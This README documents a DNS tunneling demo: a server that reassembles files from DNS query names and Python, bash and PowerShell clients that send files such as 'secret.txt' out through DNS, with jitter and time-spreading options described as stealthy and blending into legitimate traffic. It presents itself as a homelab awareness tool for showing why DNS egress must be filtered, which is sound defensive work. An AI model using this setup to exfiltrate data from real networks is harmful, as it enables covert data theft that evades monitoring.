# dns-tunnel-demo

Minimal demo of sending a file over DNS queries: a custom authoritative DNS
server reassembles files encoded in query names. For homelab / awareness demos
only — use on infrastructure you own, to show why sensitive systems must not
have unfiltered DNS egress.

## 1. Start the authoritative server

```sh
python3 server.py --bind 0.0.0.0 --port 53 --zone up.example.com --out received
```

| option | default | meaning |
|---|---|---|
| `--bind` | `127.0.0.1` | use your LAN IP in the homelab (`0.0.0.0` for all) |
| `--port` | `5353` | use `53` on a real authoritative host (needs root) |
| `--zone` | `tunnel.local` | zone the server is authoritative for; must match clients |
| `--out` | `received` | directory where reassembled files are written (SHA-256 verified) |

## 2. Send a file — pick any of the three clients

Python (needs only Python 3 stdlib):

```sh
python3 client.py --server 127.0.0.1 --port 5353 --file secret.txt
```

Pure bash, no Python (needs bash + coreutils: od, sed, tr, awk, sha256sum, dd, timeout):

```sh
bash client.sh --server 127.0.0.1 --port 5353 --file secret.txt
```

Pure PowerShell, stock Windows (only .NET BCL, works on Windows PowerShell 5.1+):

```powershell
.\client.ps1 -Server 127.0.0.1 -Port 5353 -File .\secret.txt
```

Common options (same meaning on all three clients):

| option | meaning |
|---|---|
| `--server` / `-Server` | authoritative server IP, or your lab resolver's IP to simulate exfil through normal DNS (the resolver recurses to your server) |
| `--port` / `-Port` | must match the server |
| `--zone` / `-Zone` | must match the server's `--zone` |
| `--file` / `-File` | file to send (required) |
| `--name` / `-Name` | filename on the receiving side (default: basename of the file) |
| `--delay-min` / `--delay-max` (PS: `-DelayMin` / `-DelayMax`) | random sleep between queries, in seconds — blends the traffic into legitimate DNS |
| `--spread-over SECONDS` (Python only) | auto-compute the delay range to spread the whole transfer over a given time, e.g. `--spread-over 43200` for 1 MiB over 12 h |

Examples:

```sh
# stealthy: 1-3 s random jitter between queries
python3 client.py --server 10.0.0.5 --port 53 --file big.bin --delay-min 1 --delay-max 3
bash client.sh --server 10.0.0.5 --port 53 --file big.bin --delay-min 1 --delay-max 3
.\client.ps1 -Server 10.0.0.5 -Port 53 -File .\big.bin -DelayMin 1 -DelayMax 3

# 1 MiB spread over 12 hours
python3 client.py --server 10.0.0.5 --port 53 --file big.bin --spread-over 43200
```

The server logs every query and writes each completed file to `--out`, e.g.
`[server] received received/secret.txt (5000 bytes, 143 chunks, sha256 ok)`.

## 3. One-shot loopback demo

```sh
./demo.sh
```

Starts the server on `127.0.0.1:5353`, sends a random 5 KB file with
`client.py`, and prints a sha256 comparison of original vs. reassembled file.

All three clients can run concurrently against one server; transfers are
keyed by a random session ID and verified by SHA-256.
